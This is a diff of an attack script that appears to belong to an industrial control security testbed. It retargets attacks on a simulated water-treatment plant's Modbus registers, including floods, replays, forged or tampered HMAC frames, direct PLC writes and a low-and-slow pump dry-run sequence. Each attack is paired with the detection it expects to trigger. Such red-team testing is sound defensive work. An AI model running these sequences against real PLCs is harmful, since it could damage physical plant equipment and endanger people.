@@ -11,14 +11,16 @@ PLC:
 
 Attacks (original):
     flood                  signed burst above the 5 req/s limit     -> RATE_LIMIT_EXCEEDED
-    impossible-command     signed 999 PSI tank pressure              -> OUT_OF_BOUNDS
+    impossible-command     signed out-of-range actuator value        -> OUT_OF_BOUNDS
+    sensor-write            signed write to a read-only sensor        -> WRITE_TO_SENSOR_REGISTER
     replay                 byte-identical re-send of a signed frame  -> REPLAY_DETECTED
     false-injection        legit command, then direct PLC write      (bypasses middleware)
 
 Attacks (new):
-    cross-register         low-and-slow multi-machine attack: each step is
+    cross-register         low-and-slow multi-register attack: each step is
                            in-bounds and within rate limits, but the combined
-                           heater/cooling state is unsafe  -> CROSS_REGISTER_VIOLATION
+                           raw-water pump/valve state is unsafe
+                           -> CROSS_REGISTER_VIOLATION
     hmac-missing           plain unsigned FC6 write                  -> HMAC_MISSING
     hmac-tamper            valid signed frame, value altered in transit -> HMAC_INVALID
     hmac-forged            frame signed with a guessed key           -> HMAC_INVALID
@@ -42,6 +44,7 @@ Usage:
 
     python attacker/attacker.py flood
     python attacker/attacker.py impossible-command
+    python attacker/attacker.py sensor-write
     python attacker/attacker.py replay
     python attacker/attacker.py false-injection
     python attacker/attacker.py cross-register
@@ -67,10 +70,9 @@ from docs.interfaces import (  # noqa: E402
     MACHINES,
     NUM_REGISTERS,
     FRAME_BASE,
-    TANK_PRESSURE,
-    CONVEYOR_SPEED,
-    COOLING_VALVE,
-    HEATER_TEMP,
+    MV101,
+    P101,
+    LIT101,
     to_raw,
     from_raw,
 )
@@ -219,7 +221,7 @@ def flood_attack() -> None:
 
     try:
 
-        base = read_plant(client).get(CONVEYOR_SPEED, 0.0)
+        base = read_plant(client).get(MV101, 0.0)
 
         # More than the cyber-agent limit of
         # 5 requests / second. Tiny moves so the
@@ -229,7 +231,7 @@ def flood_attack() -> None:
 
             write_signed(
                 client,
-                register=CONVEYOR_SPEED,
+                register=MV101,
                 value=round(base + 0.1 * (i + 1), 1)
             )
 
@@ -260,12 +262,12 @@ def impossible_command_attack() -> None:
 
     try:
 
-        # Tank pressure safe range:
-        # 0–100 PSI
+        # Raw Water Pump safe range:
+        # 0-100 %
 
         write_signed(
             client,
-            register=TANK_PRESSURE,
+            register=P101,
             value=999
         )
 
@@ -276,6 +278,43 @@ def impossible_command_attack() -> None:
     print(
         "[ATTACK] Impossible command complete."
     )
+
+
+# ---------------------------------------------------------
+# ATTACK 2b — SENSOR WRITE
+# ---------------------------------------------------------
+
+def sensor_write_attack() -> None:
+    """A signed, perfectly in-range write aimed at a SENSOR register. Only
+    actuator registers accept commands; the Physical Agent must drop this
+    regardless of value -> WRITE_TO_SENSOR_REGISTER."""
+
+    print("\n[ATTACK] SENSOR WRITE (command to a read-only register)")
+
+    client = connect(
+        MIDDLEWARE_HOST,
+        MIDDLEWARE_PORT
+    )
+
+    if client is None:
+        return
+
+    try:
+
+        # LIT101 (Raw Tank Level) is a sensor, 0-1000 mm. The value itself
+        # is in-bounds; the attack is writing to a sensor at all.
+
+        write_signed(
+            client,
+            register=LIT101,
+            value=500.0
+        )
+
+    finally:
+
+        client.close()
+
+    print("[ATTACK] Sensor write complete.")
 
 
 # ---------------------------------------------------------
@@ -296,7 +335,7 @@ def replay_attack() -> None:
 
     try:
 
-        register = CONVEYOR_SPEED
+        register = MV101
         value = round(read_plant(client).get(register, 0.0) + 0.5, 1)
 
         # Capture one legitimate signed frame ...
@@ -340,11 +379,11 @@ def false_injection_attack() -> None:
 
     try:
 
-        current = read_plant(middleware).get(CONVEYOR_SPEED, 0.0)
+        current = read_plant(middleware).get(MV101, 0.0)
 
         write_signed(
             middleware,
-            register=CONVEYOR_SPEED,
+            register=MV101,
             value=round(current + 1.0, 1)
         )
 
@@ -373,11 +412,12 @@ def false_injection_attack() -> None:
 
     try:
 
-        # Deliberately different value.
+        # Deliberately different, misleading value on the stage-1
+        # inlet valve - bypasses the middleware entirely.
 
         write_register(
             plc,
-            register=CONVEYOR_SPEED,
+            register=MV101,
             value=0
         )
 
@@ -461,7 +501,7 @@ def _ramp(client: ModbusTcpClient, register: int, goal: float, step: float, wait
 def cross_register_attack() -> None:
 
     print("\n[ATTACK] CROSS-REGISTER CORRELATION (low and slow)")
-    print("[ATTACK] Goal: heater >= 110 C with cooling valve <= 25 deg (thermal runaway).")
+    print("[ATTACK] Goal: RAW_PUMP_DRY_RUN - P101 >= 60% with MV101 <= 10% (raw tank runs dry).")
     print("[ATTACK] Every single command stays inside its own safe range and ramp rate.")
 
     client = connect(
@@ -474,14 +514,14 @@ def cross_register_attack() -> None:
 
     try:
 
-        print("[ATTACK] Stage 1: close the cooling valve (safe on its own - heater is low)")
-        _ramp(client, COOLING_VALVE, goal=15.0, step=10.0, wait=3.0)
+        print("[ATTACK] Stage 1: close the inlet valve (safe on its own - pump is low)")
+        _ramp(client, MV101, goal=5.0, step=10.0, wait=3.0)
 
-        print("[ATTACK] Stage 2: raise the heater setpoint (each step safe on its own)")
-        reached = _ramp(client, HEATER_TEMP, goal=118.0, step=10.0, wait=3.0)
+        print("[ATTACK] Stage 2: raise the raw-water pump speed (each step safe on its own)")
+        reached = _ramp(client, P101, goal=70.0, step=10.0, wait=3.0)
 
         if reached:
-            print("[ATTACK] Heater reached goal - combined unsafe state was NOT prevented!")
+            print("[ATTACK] Pump reached goal - combined unsafe state was NOT prevented!")
         else:
             print("[ATTACK] Middleware refused the step that completes the unsafe combination.")
 
@@ -505,9 +545,9 @@ def hmac_missing_attack() -> None:
         return
 
     try:
-        current = read_plant(client).get(COOLING_VALVE, 45.0)
+        current = read_plant(client).get(MV101, 32.0)
         # A perfectly safe value - the only problem is that it is unsigned.
-        write_register(client, COOLING_VALVE, round(current + 1.0, 1))
+        write_register(client, MV101, round(current + 1.0, 1))
     finally:
         client.close()
 
@@ -523,13 +563,13 @@ def hmac_tamper_attack() -> None:
         return
 
     try:
-        current = read_plant(client).get(HEATER_TEMP, 60.0)
-        frame = hmac_auth.build_frame(HEATER_TEMP, round(current + 1.0, 1))
+        current = read_plant(client).get(P101, 50.0)
+        frame = hmac_auth.build_frame(P101, round(current + 1.0, 1))
 
         # Intercepted in transit: change the value, keep the original tag.
-        frame[2] = to_raw(140.0)
+        frame[2] = to_raw(95.0)
 
-        send_frame(client, frame, "tampered HEATER_TEMP=140.0 (original tag)")
+        send_frame(client, frame, "tampered P101=95.0 (original tag)")
     finally:
         client.close()
 
@@ -546,8 +586,8 @@ def hmac_forged_attack() -> None:
 
     try:
         wrong_key = secrets.token_hex(32).encode()
-        current = read_plant(client).get(COOLING_VALVE, 45.0)
-        write_signed(client, COOLING_VALVE, round(current + 1.0, 1), key=wrong_key)
+        current = read_plant(client).get(MV101, 32.0)
+        write_signed(client, MV101, round(current + 1.0, 1), key=wrong_key)
     finally:
         client.close()
 
@@ -563,9 +603,9 @@ def delayed_replay_attack() -> None:
         return
 
     try:
-        current = read_plant(client).get(CONVEYOR_SPEED, 0.0)
+        current = read_plant(client).get(MV101, 32.0)
         old_ts = int((time.time() - 300) * 1000)
-        write_signed(client, CONVEYOR_SPEED, round(current + 1.0, 1), timestamp_ms=old_ts)
+        write_signed(client, MV101, round(current + 1.0, 1), timestamp_ms=old_ts)
     finally:
         client.close()
 
@@ -579,6 +619,7 @@ def delayed_replay_attack() -> None:
 ATTACKS = {
     "flood": flood_attack,
     "impossible-command": impossible_command_attack,
+    "sensor-write": sensor_write_attack,
     "replay": replay_attack,
     "false-injection": false_injection_attack,
     "cross-register": cross_register_attack,
